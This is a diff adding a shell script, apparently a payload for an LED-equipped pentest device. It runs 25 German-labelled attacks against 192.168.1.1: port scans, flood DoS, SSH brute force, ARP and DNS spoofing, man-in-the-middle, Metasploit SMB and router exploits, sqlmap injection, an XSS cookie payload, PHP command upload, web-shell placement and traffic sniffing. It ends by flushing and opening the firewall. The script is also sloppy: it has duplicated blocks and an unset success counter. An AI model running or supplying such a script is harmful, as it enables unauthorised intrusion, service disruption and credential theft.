@@ -1,0 +1,278 @@
+LED BLUE
+
+# Angriff 1: Port-Scanning
+nmap -sS -T4 192.168.1.1
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 2: DoS-Angriff
+hping3 -S -P -U --flood -V -p 80 192.168.1.1
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 3: Brute-Force-Angriff
+hydra -l admin -P /root/wordlist.txt -f 192.168.1.1 ssh
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 4: ARP-Spoofing
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.254
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 5: Exploit
+msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; run"
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 6: DNS-Spoofing
+dnsspoof -i eth0 -f /root/hosts 192.168.1.1
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 7: Passwort-Sniffing
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i password
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 8: Man-in-the-Middle-Angriff
+ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.254/
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 9: SQL-Injection
+sqlmap -u "http://192.168.1.1/login.php" --data "username=admin&password=password" --level=5 --risk=3
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 10: Cross-Site-Scripting-Angriff
+wget --post-data='name=<script>alert(document.cookie)</script>&comment=test' http://192.168.1.1/comment.php
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 11: MAC-Spoofing
+macchanger -r eth0
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 12: Passwort-Brute-Force
+john /root/passwords.txt --users=admin --wordlist=/root/wordlist.txt
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 13: Social-Engineering-Angriff
+phishing-frenzy
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 14: Router-Exploit
+msfconsole -q -x "use exploit/multi/router/dlink_dir_645_password_disclosure; set RHOST 192.168.1.1; run"
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 15: Bluetooth-Sniffing
+btscanner -r -O -B
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 16: ARP-Spoofing
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.254
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 17: E-Mail-Spoofing
+echo "Test-Email" | mail -s "Test-Subject" -aFrom:test@example.com -aReply-To:recipient@example.com recipient@example.com
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 18: MAC-Flooding
+macof -i eth0
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 19: Denial-of-Service-Angriff
+hping3 -S -a 192.168.1.1 -p 80 --flood
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 20: Remote-Code-Execution
+curl -d "<?php system('id'); ?>" "http://192.168.1.1/upload.php"
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 21: Web-Shells
+wget "http://192.168.1.1/shell.php" -O /var/www/html/shell.php
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 22: DNS-Reflection-Angriff
+dig @192.168.1.1 ANY isc.org
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 23: Port-Scanning
+nmap -sS -p 1-65535 192.168.1.1
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 24: Netzwerk-Sniffing
+wireshark -i eth0
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED BLUE
+
+# Angriff 25: WLAN-Sniffing
+airodump-ng --output-format pcap --write /root/capture wlan0
+if [ $? -eq 0 ]; then
+    LED GREEN
+else
+    LED RED
+fi
+
+LED PINK
+
+# Firewall deaktivieren, wenn mindestens ein Angriff erfolgreich war
+if [ $GREEN_COUNT -gt 0 ]; then
+    iptables -P INPUT ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -F
+    iptables -X
+fi
+
+LED PINK
+
+# Firewall deaktivieren, wenn mindestens ein Angriff erfolgreich war
+if [ $GREEN_COUNT -gt 0 ]; then
+    iptables -P INPUT ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -F
+    iptables -X
+    if [ $? -eq 0 ]; then
+        LED GREEN
+    else
+        LED RED_GREEN_BLINK
+    fi
+else
+    LED RED_BLINK
+fi
